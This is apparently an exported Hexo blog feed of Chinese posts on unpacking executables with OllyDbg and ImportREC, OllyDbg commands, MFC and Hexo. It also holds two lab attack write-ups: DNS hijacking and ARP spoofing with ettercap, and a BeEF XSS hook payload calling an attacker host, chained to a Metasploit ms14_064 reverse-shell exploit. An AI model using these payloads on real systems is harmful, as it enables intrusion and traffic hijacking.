    <content><![CDATA[<h1 id="找OEP的一个小技巧"><a href="#找OEP的一个小技巧" class="headerlink" title="找OEP的一个小技巧"></a>找OEP的一个小技巧</h1><p>我们载入程序，但在这里我发现了一个小问题，我用之前的一个OD载入之后我进入的却是系统的领空，而且一直进入不了用户组的代码，如下图所示：<br><img src="img1.jpg" alt="未进入程序领空"><br>但是我重换了一个比较基础的OD却发现是停留在程序的领空，如下图所示：<br><img src="img2.jpg" alt="程序领空"><br>这个时候我们先暂且不去深究这个的原因，之后再去研究具体的错误设置。<br>这个程序我们使用单步跟踪法来进行脱壳。<br>一步一步的往下跟踪，直到这个地方：<br><img src="img3.jpg" alt="程序OEP关键跳转"><br>我们可以看到这个时候的jnz是准备跳过去，但是我们发现塔下一个CALL却是call了一个[EBX+C]，这个地方就是比较关键的地方，因为一般壳为了保护自身，都会喜欢将地址转换到一些寄存在加偏移的一个相对基址寻址的地方，我们修改我们标志寄存器的值，让他不进行跳转，然后步入，我们会进入这个地方：<br><img src="img4.jpg" alt="程序OEP"><br>这里我们比较要注意的地方是，OD在这个地方我们一般要进行分析代码，也就是Ctrl+A，有的时候壳非常喜欢这个寄存器间接跳转，我们可以用回车键，或者Ctrl+G跳转到那个位置，看看像不像，然后选择步入。</p>
<h1 id="重建输入表"><a href="#重建输入表" class="headerlink" title="重建输入表"></a>重建输入表</h1><p>接着上面的，我们用我们常用的方法，进行dump，这里不演示了，我就直接脱掉。<br>这个时候我们在使用import REC的时候我们发现，貌似所有的函数都是无效的，这个时候我们就需要进行手动修改了，这里我提供两种方法：</p>
<h2 id="第一种：快速搜索法"><a href="#第一种：快速搜索法" class="headerlink" title="第一种：快速搜索法"></a>第一种：快速搜索法</h2><p>其实虽然import REC给我们的不是很正确，但是我们DD过去看一下：<br><img src="img5.jpg" alt="输入表附近"><br>这个时候我们自己定位一下，看一下上下方否是一片0的地方，从头拉到尾。<br><img src="img6.jpg" alt="输入表头部"><br><img src="img7.jpg" alt="输入表结尾"><br>这个时候就是可以了的，我们输入起始的RVA：2500，大小0x538,这个大小如果不是太确定，我们可以使用1000，但不是太建议，特殊情况下不要了，这个时候我们常规方法进行dump。</p>
<h2 id="第二种：CALL地址搜索法"><a href="#第二种：CALL地址搜索法" class="headerlink" title="第二种：CALL地址搜索法"></a>第二种：CALL地址搜索法</h2><p>这个方法比较直接，我们可以直接看他OEP下方CALL的地址，例如：<br><img src="img8.jpg" alt="快速CALL定位输入表"><br>只要是下方的CALL地址就行，这个时候就到输入表的头部了，然后就可以了。</p>
]]></content>
      <categories>
        <category>脱壳分析</category>
      </categories>
      <tags>
        <tag>脱壳分析</tag>
      </tags>
  </entry>
  <entry>
    <title>LoadPE and importREC</title>
    <url>/2020/01/13/LoadPE-and-importREC/</url>
    <content><![CDATA[<h2 id="LoadPE"><a href="#LoadPE" class="headerlink" title="LoadPE"></a>LoadPE</h2><p>这款工具还是比较有名的，在刚学PE结构之前，就对这个工具有所了解，主要是简单的介绍一下配合OD和importREC的使用，在之后深入了解。<br>首先我们先对找到OEP的工具加载。<br><img src="img1.jpg" alt="LoadPE"><br>在这个列表框中找到我们所在的进程<br><img src="img2.jpg" alt="纠正镜像大小"><br>纠正一下镜像文件的大小，然后点击完全脱壳，会生成一个dump的文件。<br><img src="img9.jpg" alt="完全脱壳"><br>这款工具比较强大的其实是他的PE编辑器，我们之后再去讨论。</p>
<h2 id="import-REC"><a href="#import-REC" class="headerlink" title="import REC"></a>import REC</h2><p>这款工具是用来修复IAT的一些信息，由于这款工具可以自动找到我们的函数入口点之类的信息，所一比较方便，测试的软件加密的比较简单，所以不需要回OD进行查找，之后有机会和LoadPE一款演示。<br>言归正传，我们选择我们的进程。<br><img src="img3.jpg" alt="选择进程"><br>需要填写我哦们OEP的一个相对RAV，然后点击自动搜索IAT，获取输入表，再点击显示无效的函数，后对无效的函数进行cut掉就好了。<br><img src="img4.jpg" alt="获取IAT"><br>如果出现这个状况，我们一般通过OD进行确认一遍。<br>我们记住他返回给我们的RVA和size<br><img src="img5.jpg" alt="检查"><br>然后在OD中查看他的内容，dd就可以了，还可以看大一些提示信息。<br>import REC只是给我们以个大体的范围。<br>我们需要自己验证一下。<br><img src="img6.jpg" alt="验证"><br>我们，拖动字节为00的地方（一大片0的地方），然后看OD给我们指示的长度大小。<br><img src="img7.jpg" alt="验证"><br>与我们的import REC的结果相同，这个就很舒服了，嘻嘻。<br>回到我们的import REC，点击获取输入表。<br><img src="img8.jpg" alt="获取输入表"><br>这个时候就可以了，由于VB的程序比较特殊，输入表之类的都是自己搞的，和我们C++写的程序是有一些不同的。<br>我们点击修复抓取文件，选择哪个程序，他会生成一些  文件名_.exe的文件。<br><img src="img10.jpg" alt="修复完毕"><br>这个样子就脱壳完毕了。</p>
]]></content>
      <categories>
        <category>脱壳分析</category>
      </categories>
      <tags>
        <tag>脱壳分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Common-Unshell</title>
    <url>/2020/01/12/Common-Unshell/</url>
    <content><![CDATA[<h1 id="常见的脱壳方式"><a href="#常见的脱壳方式" class="headerlink" title="常见的脱壳方式"></a>常见的脱壳方式</h1><p>首先我们使用PEID进行查壳<br><img src="img1.jpg" alt="查壳"><br>发现是：ASPack 2.12 -&gt; Alexey Solodovnikov的壳，我们进行脱壳。</p>
<h2 id="单步跟进"><a href="#单步跟进" class="headerlink" title="单步跟进"></a>单步跟进</h2><p>其实这个方法就是最直接的，我们直接单步跟踪，向上的跳转在下一步按F4，指导跟踪到大的jmp，这样的关键性标识也有popad，但是这个一般要在一开始的程序入口点是pushad这个寄存机，例如：<br><img src="img2.jpg" alt="pushad"><br>我们一直跟踪，跟到这个地方。<br>但是下面有个call，我们单步步过的话呢，发现程序运行起来了，我们需要跟进。<br><img src="img3.jpg" alt="popad"><br>我们可以看到，我们运行到了popad，下面紧跟着跳转和retn，这个就很像了，我们继续运行。<br><img src="img4.jpg" alt="OEP"><br>可以看到这个retn就跳转到了我们的OEP，但是要记住删除代码分析，这个是一个比较明显的VB程序，而且我们的代码段回到了RAV1000的位置，这个时候我们用插件Dump出来。<br><img src="img5.jpg" alt="查壳"><br>确实是一个VB的程序。</p>
<h2 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h2><p>其实也就是ESP改变的时候我们下一个硬件断点，然后运行，ESP改变的时候程序暂停，我么单步跟下就可以了。<br><img src="img7.jpg" alt="HWESP"><br>然后我们运行（删除硬件断点不要忘记），会来到这个位置：<br><img src="img8.jpg" alt="OEPJmp"><br>可以看到确实快到了，我们但不跟踪几下就可以了。</p>
<h2 id="关键搜索"><a href="#关键搜索" class="headerlink" title="关键搜索"></a>关键搜索</h2><p>其实也就是搜索popad，记住不要搜索整个快，因为太大了，我们Ctrl+F进行搜索，会看到如下的结果：<br><img src="img9.jpg" alt="区段"><br>我们Ctrl+L就可以搜索下一个，记住一般来说，附近都有大的跳转和返回，一般也就是跨区段的跳转。</p>
<h2 id="二次镜像法"><a href="#二次镜像法" class="headerlink" title="二次镜像法"></a>二次镜像法</h2><p>首先我们对我们rsrc（资源）断下内存写入断点，这个就是进行解密，然后再对我们的code（代码）断进行下内存写入断点，这个样子就能到达我们的OEP了，具体操作如下：<br>点击M打开区段表。<br><img src="img10.jpg" alt="区段"><br>然后我们就会运行到这个位置：<br><img src="img11.jpg" alt="断下"><br>然后我们下我们code断点，然后运行。<br><img src="img12.jpg" alt="断下"><br>然后我们运行之后会运行到这个地方：<br><img src="img13.jpg" alt="OEPJmp"><br>然后就到我们熟悉的地方了。</p>
<h2 id="EIP跟踪法"><a href="#EIP跟踪法" class="headerlink" title="EIP跟踪法"></a>EIP跟踪法</h2><p>这个方法之前就了解了，使用OD的TC指令进行表达式计算，主要是找到我们的壳的区间，然后使用tc eip&lt;xxxxxxx，进行下端，tc这类的指令大家可以去看我的：<br><a href="https://wker666.github.io/2020/01/12/OD-QuickKeyBoard/" target="_blank" rel="noopener" title="OD快捷代码">https://wker666.github.io/2020/01/12/OD-QuickKeyBoard/</a><br>其实也就是对制定跟踪直到eip的位置到达了：<br><img src="img14.jpg" alt="区段"><br>我们按下Enter，然后运行，他会很慢的运行。<br>（不总么会用，之后深究一下）</p>
<h2 id="SFX跟踪法"><a href="#SFX跟踪法" class="headerlink" title="SFX跟踪法"></a>SFX跟踪法</h2><p>通过OD给我们的SFX（暂时还不知道这是个什么，应该是有点异常的意思，之后会出相关的知识学习）进行跟踪<br><img src="img15.jpg" alt="选项"><br>选择SFX，选择第二个选项（有点时候需要第三个，具体看情况）：<br><img src="img16.jpg" alt="选项"><br>然后重新启动程序，就会直接到达OEP，但记住要调回来哦。<br><img src="img17.jpg" alt="OEPJmp"></p>
<p><strong><strong><em>这是比较常见的一些脱壳技巧，之后还会更新。</em></strong></strong></p>
]]></content>
      <categories>
        <category>脱壳分析</category>
      </categories>
      <tags>
        <tag>脱壳分析</tag>
      </tags>
  </entry>
  <entry>
    <title>OD-QuickKeyBoard</title>
    <url>/2020/01/12/OD-QuickKeyBoard/</url>
    <content><![CDATA[<p>CALC :         判断表达式<br>WATCH :      添加监视表达式<br>AT :             在指定地址进行反汇编<br>FOLLOW :     跟随命令<br>ORIG :         反汇编于 EIP<br>DUMP           在指定地址进行转存<br>DA :            转存为反汇编代码<br>DB :            使用十六进制字节格式转存<br>DC :            使用 ASCII 格式转存<br>DD :            转存在堆栈格式<br>DU :            转存在 UNICODE 格式<br>DW :           使用十六进制字词格式转存<br>STK :          前往堆栈中的地址<br>AS  :          （AS + 地址 + 字符串） 在指定地址进行汇编<br>BP :             进行条件中断（有条件的断点）<br>BPX :           中断在全部调用 （Call）<br>BPD :           清除全部调用中的断点<br>BC :             清除断点<br>MR :             内存断点于访问时<br>MW :            内存断点于写入时<br>MD :             清除内存断点<br>HR :             访问时进行硬件中断<br>HW :            写入时进行硬件中断<br>HE :              执行时进行硬件中断<br>HD :              清除硬件断点<br>STOP :          停止运行程序调试<br>PAUSE :        暂停执行程序调试<br>RUN :            运行程序进行调试<br>GE :              运行和通过例外<br>SI :              单步进入 Call 中<br>SO :             步过 Call<br>TI :              跟踪进入直到地址<br>TO :            跟踪步过直到地址<br>TC :            跟踪进入直到满足条件<br>TOC :          跟踪步过直到满足条件<br>TR :            运行直到返回<br>TU :            运行直到用户代码<br>LOG :          查看记录窗口<br>MOD :         查看模块窗口<br>MEM :          查看内存窗口<br>CPU :           查看 CPU 窗口<br>CS :            查看 Call 堆栈<br>BRK :           查看断点窗口<br>OPT :           打开选项设置窗口<br>EXIT :          退出 OllyDbg<br>QUIT :          退出 OllyDbg<br>OPEN :         打开一个可执行文件<br>CLOSE :       关闭可执行文件  </p>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>MFC-LoadBitmap</title>
    <url>/2020/01/11/MFC-LoadBitmap/</url>
    <content><![CDATA[<h1 id="MFC学习记录"><a href="#MFC学习记录" class="headerlink" title="MFC学习记录"></a>MFC学习记录</h1><p>今天在回头用Picture control这个控件的时候，发现出现一些错误，这里记录一下，不要以后踩坑了。<br>当我们要加载一幅位图时，我们要讲这个控件的Type属性设置为Bitmap，否则你将会一直加载不出位图，默认的只是加载一个无填充的矩形框。<br>下面是一些属性：</p>
<blockquote>
<p>Type属性</p>
<blockquote>
<p>Frame：显示一个无填充的矩形框，边框颜色可以通过Color属性的下拉列表设定<br>Etched Horz：显示一条横分割线<br>Etched Vert：显示一条竖分割线<br>Rectangle：显示一个填充的矩形框，矩形颜色可通过Color属性的下拉列表设定<br>Icon：显示一个图标（Icon），图标通过Image 下拉列表来设置图标资源ID<br>Bitmap：显示一个位图（Bitmap），位图通过Image 下拉列表来设置位图资源ID<br>Enhanced Metafile：显示一个加强的元数据文件（Metafile）<br>Owner Draw：自绘</p>
</blockquote>
</blockquote>
<p>并且在这里我们设置好后，如果我们要用MFC给我们的CBitmap类的话呢，可以直接使用图片的ID号，如果用LoadBitmap(Hinstance可以通过AfxGetApp()-&gt;m_hinstance获得)，我们的第二个参数要通过MAKEINTRESOURCE转换，而不是文件路径，LoadImage也有个坑也需要记录一下，LR_LOADFROMFILE这个才是加载文件到内存。常用的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CBitmap bitmap;  &#x2F;&#x2F; CBitmap对象，用于加载位图   </span><br><span class="line">HBITMAP hBmp;    &#x2F;&#x2F; 保存CBitmap加载的位图的句柄   </span><br><span class="line">bitmap.LoadBitmap(IDB_BITMAP1);  &#x2F;&#x2F; 将位图IDB_BITMAP1加载到bitmap </span><br><span class="line">hBmp &#x3D; (HBITMAP)bitmap.GetSafeHandle();  &#x2F;&#x2F; 获取bitmap加载位图的句柄   </span><br><span class="line">m_jzmPicture.SetBitmap(hBmp);    &#x2F;&#x2F; 设置图片控件m_jzmPicture的位图图片为IDB_BITMAP1</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>ettercap</title>
    <url>/2020/01/08/ettercap/</url>
    <content><![CDATA[<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>劫持内网数据包，强行更改DNS</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：Kali(192.168.209.137)<br>靶机：32位XP(192.168.209.129)<br>我们使用ETTERCAP</p>
<p>ETTERCAP一款著名的嗅探劫持工具，比较好用的插件就要数DNS劫持和ARP欺骗了。<br>使用<strong><em>vim /etc/ettercap/etter.dns</em></strong>编辑我们的配置文件,在这之前，我们需要先规范我们的思路，在这里既然可以劫持DNS，</p>
<p>这个时候我们的ettercap就该上场了，我们首先设置我们的DNS劫持页面。<br><strong><em>vim /etc/ettercap/etter.dns</em></strong> 使用VIM进行编辑，也可以用自带的文本进行编辑。<br>将下面的这段文本找到并改为这个样子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">microsoft.com      A   107.170.40.56</span><br><span class="line">*.microsoft.com    A   107.170.40.56</span><br><span class="line">www.microsoft.com  PTR 107.170.40.56      # Wildcards in PTR are not allowed</span><br><span class="line">*				 A	 192.168.209.137   #这两条使我们添加的</span><br><span class="line">*				 PTR  192.168.209.137  #这两条使我们添加的</span><br></pre></td></tr></table></figure>
<p>我们打开劫持工具，首先设置我们的网卡：<br><img src="img1.jpg" alt="网卡设置"></p>
<p>设置好我们的网卡之后，我们扫描内网的机子，然后设置劫持，这里点击这两项：<br><img src="img2.jpg" alt="网卡设置"><br>我们会得到如下的几个IP：<br><img src="img3.jpg" alt="网卡设置"></p>
<p>首先.1的使我Win10的机子，.2是我的网关，.129是目标的机子，这个时候我们将.2的机子Add to Target1，.129的机子Add to Target2.<br>之后我们设置我们的ARP，根据我这个样子进行设置：</p>
<p><img src="img4.jpg" alt="网卡设置"></p>
<p>设置我之后我们选择插件进行执行了，选择</p>
<p><img src="img5.jpg" alt="网卡设置"></p>
<p>我们点击Start sniffing<br>然后我们在靶机上访问百度，会看到我们的结果：<br><img src="img6.jpg" alt="网卡设置"><br>并且我们的ettercap会收到如下的信息：<br><img src="img7.jpg" alt="网卡设置"></p>
<p>到此为止，我们的劫持就成功了，这是一种比较简单的方式，下章劫持我会介绍一下如何ARP欺骗的断网攻击，这样帮助我们在渗透测试网站的时候可以拿到C段就可以C段劫持。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>BEEF+MSF</title>
    <url>/2020/01/06/BEEF-MSF/</url>
    <content><![CDATA[<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>通过IE的漏洞提升我们的权限</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：Kali(192.168.209.138)<br>靶机：32位XP(192.168.209.129)<br>我们使用BEEF+MSF</p>
<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>我们就可以联想到使用MSF的ms14_064_ole_code_execution脚本，他可以利用IE浏览器的漏洞，这里我们配置一下属性，他会生成一个URL给我们，具体配置如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution &#x2F;&#x2F;使用064的脚本</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp  &#x2F;&#x2F;使用交互的shell</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set srvhost 192.168.209.137 &#x2F;&#x2F;设置主机</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set uripath &#x2F;</span><br><span class="line">上面这一句是设置我们的路径，这样设置就可以了</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set lhost 192.168.209.138  &#x2F;&#x2F;设置监听主机</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set AllowPowershellPrompt true</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; exploit &#x2F;&#x2F;开始执行</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.209.138:4444 </span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; [*] Using URL: http:&#x2F;&#x2F;192.168.209.138:8080&#x2F;</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>

<p>可以看到我们的监听端口未8080，也就是我们默认的端口号。</p>
<p>既然我们的监听端开启了，我们就来利用BEEF欺骗吧，首先打开我们的BEEF，这里说一下我的Kali没有自带，大家一样的话呢需要安装的。</p>
<p>打开BEEF之后会出现下面的页面：<br><img src="img1.jpg" alt="BEEF页面"></p>
<p>我们扫描一下目标网站的端口，发现开了80，打开网站，发现这么一个网址：</p>
<p><img src="img2.jpg" alt="网站页面"></p>
<p>发现是一个小论坛，我们猜测有XSS，这个时候我们提交我们的恶意JS代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC&#x3D;http:&#x2F;&#x2F;192.168.209.138:3000&#x2F;hook.js&gt;&lt;&#x2F;sCrIpT&gt;</span><br></pre></td></tr></table></figure>

<p>这是一个比较广泛的用法，我们提交上去，当管理员，打开这个链接的时候，管理员会看到如下的页面：<br><img src="img3.jpg" alt="管理员视野"></p>
<p>我们的BEEF上线了：<br><img src="img4.jpg" alt="BEEF上线页面"></p>
<p>忽略我之前测试的哪一个。<br>这个时候我们上线我们的MSF，<a href="http://192.168.209.138:8080" target="_blank" rel="noopener">http://192.168.209.138:8080</a><br>这个URL，使我们的MSF利用URL，我们使用BEEF的：Redirect Browser插件，将我们的页面强行重定向为我们的MSF页面，这个时候我们的Session就上线了：<br><img src="img5.jpg" alt="BEEF重定向"></p>
<p><img src="img6.jpg" alt="上线效果图"><br>这个时候我们使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sessions -i</span><br></pre></td></tr></table></figure>
<p>查看我们的session，如果和效果图一样，那说明我们拿到权限了，然后使用sessions 1来执行我们的shell，这个1是根据上线的ID号，从1开始排序的。<br>然后简单执行以下dir：<br><img src="img7.jpg" alt="MSF执行"><br><img src="img8.jpg" alt="MSF执行"><br>这个时候发现已经可以了，这个时候其实我们就已经达到了拿取Shell的目的。<br>我们还是可以配合ettercap进行劫持提权，这个留给大家自己去思考，不知道的可以参考我的关于ettercap的文章。<br>其实写这篇文章的过程有很多坎坷，中途XP无数次蓝屏，原因我的Windbg给搞的，希望大家多多关注。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>BeginToLearn-Unshell</title>
    <url>/2020/01/06/%E8%84%B1%E5%A3%B3%E5%AD%A6%E4%B9%A01/</url>
    <content><![CDATA[<h1 id="脱壳学习"><a href="#脱壳学习" class="headerlink" title="脱壳学习"></a>脱壳学习</h1><h2 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h2><p>初学脱壳，之前学习了反汇编的知识，开始学习脱壳</p>
<p>最初接触的脱壳比较好用的就是ESP定律脱壳，方法比较简单，在ESP的值改变的时候给ESP下硬件的一个断点，比较方便的是：<br><img src="img1.jpg" alt="ESP断点"><br>我们点击运行，之后他一一般会断下，之后就会看到一些跳转，这些跳转中比较重要的是jmp跳转，jmp跳转之后我们但不跟过去，一般就是可以跳到我们的OEP位置<br><img src="img2.jpg" alt="ESP断点"><br><strong>这个时候可能会有向上的跳转，我们不分析太细节的话呢，我们直接在jmp上下断点，运行，让他直接到jmp，之后就会跳到OEP，主要要关注的是否是跨区段的跳转，如果是跨区段的跳转，并且跳转的结束位置是我们的代码区块，那么一般就到我们真正的OEP，但是可能出现OD将这段代码误认为ASCII码，所以我们需要删除分析或者分析代码，效果图如下：</strong><br><img src="img3.jpg" alt="ESP断点"></p>
<h1 id="Dump出脱壳文件"><a href="#Dump出脱壳文件" class="headerlink" title="Dump出脱壳文件"></a>Dump出脱壳文件</h1><p>这里可以简单的使用OD带的插件，如果不行的话呢用import REC，再不行我们就手动修改IAT使用loadPE，这里这个小程序我们使用OD的插件就可以了，具体操作如下：<br><img src="TK1/img4.jpg" alt="ESP断点"><br>这里注意，如果我们插件不行的话呢，我们需要取消勾选重建输入表，目的是为了我们能够在其他工具中重新建表，这样子生成的文件我们就能够方便调试了。</p>
]]></content>
      <categories>
        <category>脱壳分析</category>
      </categories>
      <tags>
        <tag>脱壳分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo-Method</title>
    <url>/2020/01/05/Hexo-Method/</url>
    <content><![CDATA[<h1 id="Hexo语法"><a href="#Hexo语法" class="headerlink" title="Hexo语法"></a>Hexo语法</h1><p>文章持续更新</p>
<h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><p>新建一篇文章，先试用hexo new “title”新建一篇文章，使用hexo -g d命令部署发布。</p>
<h2 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h2><p>先删除你要删除的文章md文章，然后进行hexo -g d部署就可以了(别忘记删除文章的文件夹)<br>但是部署之后可能需要好几秒种之后才会在网站上刷新</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>在我们想使用#的时候要注意，#后面我们需要加上一个空格，否则不会解析</p>
<h2 id="加入图片"><a href="#加入图片" class="headerlink" title="加入图片"></a>加入图片</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![你想输入的替代文字](xxxx&#x2F;图片名.jpg)</span><br><span class="line">这个图片要放在生成的文件的文件夹中，网上好多的方法不知道是不是错误的，反正我是不行，可能是编译器的问题吧</span><br></pre></td></tr></table></figure>
<p>测试效果如下：<br><img src="test/test.jpg" alt="测试的图片"></p>
<h2 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h2><p>使用&gt;可以设置我们的层次，可以多个&gt;多层次</p>
]]></content>
  </entry>
</search>
